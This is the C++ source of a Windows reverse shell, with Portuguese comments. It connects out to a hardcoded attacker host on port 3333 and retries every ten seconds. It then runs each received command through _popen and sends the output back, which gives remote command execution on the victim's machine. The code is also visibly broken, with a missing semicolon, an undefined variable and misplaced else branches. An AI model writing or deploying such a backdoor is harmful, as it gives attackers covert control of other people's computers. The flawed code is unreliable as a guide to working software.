//////////////
//Autor: Raique
//Machine Target: Windows Client
//Nickname: Rablidad
//Versão: tem muita coisa ainda para adicionar (Não considero esta ainda uma versão final)
/////////////

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <cstring>
#include <stdexcept>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <regex>
#include <array>
#include <cstdio>
#include <memory>

using std::cout;
using std::cin;
using std::vector;
using std::exception;
using std::endl;
using std::string;
using std::array
using std::unique_ptr;

void return_cmd(SOCKET& sockfd);

int main(){
	int connect_result;
	WSADATA wsa;
	//
	//##### struct target addr ######
	const char * host = "192.168.1.31";//"189.78.63.187";
	u_short port = 3333;
	struct sockaddr_in taddr;
	taddr.sin_port = htons(port);
	taddr.sin_family = AF_INET;
	taddr.sin_addr.s_addr = inet_addr(host);
	std::memset(&taddr.sin_zero, '\0', sizeof(taddr.sin_zero));

	int sin_size = sizeof(taddr);

	// ##############################
	//
	WSAStartup(MAKEWORD(2, 0), &wsa);
	SOCKET sockfd = socket(PF_INET, SOCK_STREAM, 0);
	while(true){
		try{
			cout << "[*] Tentando conexão." << endl;	
			if((connect_result = connect(sockfd,(struct sockaddr *)&taddr, sin_size)) == -1)
				throw 99;
			else
				break;
		}catch(int e){
			cout << "[-] Conexão Falhou." << endl;
			cout << "[-] Erro:  " << e << endl;
			cout << "[*] Tentando novamente em 10 segundos." << endl;
			sleep(10);
		}
	}

	
	
	return_cmd(sockfd);

	closesocket(sockfd);


	WSACleanup();
	return 0;

}

void return_cmd(SOCKET& sockfd){
	const unsigned int MBL = 4096; // MAX_BUF_LENGTH
	const unsigned int MRL = 256;// MAX_RCV_LENGTH
	char rcv[MBL];
	int bytesReceived = 0;
	string data;
	char read[MBL];
	char cliente[]= "[-] Não Foi Recebido";
	char clienterr[] = "[-] Cliente-Side Error.";
	size_t sin_size2 = sizeof(clienterr);
	size_t sin_size1 = sizeof(cliente);
	char pwd[128];
	string result;
	char buffer[MRL];
	FILE * fp;

	while(true){
		bytesReceived = recv(sockfd, rcv, MRL , 0);
		if(bytesReceived == -1){

			send(sockfd, cliente, sin_size1 , 0);
			continue;
		}
		else{

			if(((strncmp(rcv, "exit", 4)) == 0) || (((strncmp(rcv, "Exit", 4)) == 0))){
				main();
			}
			else{
				if((strncmp(rcv, "pwd", 3)) == 0){
					_getcwd(pwd, 128);
					send(sockfd, pwd , sizeof(pwd), 0);
					continue;
				}
				else{
					fp= _popen(rcv, "rt");
					if(fp){
					//if((fp = _popen(rcv, "r")) != NULL){
					
						while(fgets(buffer, MRL, fp) != NULL) data.append(buffer);
					}
						
						send(sockfd, data.c_str(), sizeof(readcat), 0);
						continue;
					//}

					else{
						// some code here in case _popen doesnt work well
						send(sockfd, clienterr, sin_size2, 0);
						continue;
					
					}
					
					
					}

				}
			
			}
		}
		
		
	_pclose(fp);
}
